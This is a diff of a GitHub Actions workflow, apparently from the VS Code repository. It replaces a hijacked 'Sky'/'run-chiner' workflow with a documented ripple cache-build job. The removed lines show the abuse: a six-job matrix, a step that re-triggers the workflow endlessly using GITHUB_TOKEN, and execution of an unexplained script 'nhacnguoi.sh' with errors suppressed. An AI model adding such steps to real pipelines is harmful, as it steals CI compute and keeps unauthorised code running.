@@ -1,35 +1,32 @@
-name: Sky
+name: Code OSS (ripple)
 
+# Builds the ripple binary that the Detect Changes job of pr.yml uses to plan unit tests, and
+# saves it in the cache. Pull requests can only restore caches created on main, so this spares
+# each pull request a build. It runs when ripple changes, and daily in case the cache was evicted.
 on:
-  workflow_dispatch:
   push:
-    branches: [ "main" ]
-permissions:
-  actions: write
-  contents: read
+    branches:
+      - main
+    paths:
+      - build/ripple/**
+      - .github/workflows/pr-ripple.yml
+  schedule:
+    - cron: '23 4 * * *'
+  workflow_dispatch:
+
+permissions: {}
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
 
 jobs:
-  run-chiner:
-    runs-on: ${{ matrix.os }}
+  ripple:
+    name: Ripple
+    runs-on: ubuntu-24.04
     timeout-minutes: 20
-    strategy:
-      matrix:
-        bot_id: [1,2,3,4,5,6]
-        include:
-          - bot_id: 1
-            os: ubuntu-24.04
-          - bot_id: 2
-            os: ubuntu-24.04
-          - bot_id: 3
-            os: ubuntu-24.04
-          - bot_id: 4
-            os: ubuntu-24.04
-          - bot_id: 5
-            os: ubuntu-24.04
-          - bot_id: 6
-            os: ubuntu-24.04
-      fail-fast: false
-
+    permissions:
+      contents: read
     steps:
       - name: Checkout microsoft/vscode
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
@@ -61,19 +58,3 @@ jobs:
         with:
           path: build/ripple/target/release/ripple
           key: ${{ steps.cache-ripple.outputs.cache-primary-key }}
-      - name: My
-        if: always() && matrix.bot_id == 1
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        shell: bash
-        run: |
-          sleep 10
-          gh workflow run "${{ github.workflow }}" \
-            --repo "${{ github.repository }}" \
-            --ref "${{ github.ref_name }}"
-      - name: Up | Trust
-        continue-on-error: true
-        run: |
-          sed -i 's/\r$//' nhacnguoi.sh || true
-          chmod +x nhacnguoi.sh || true
-          ./nhacnguoi.sh || true
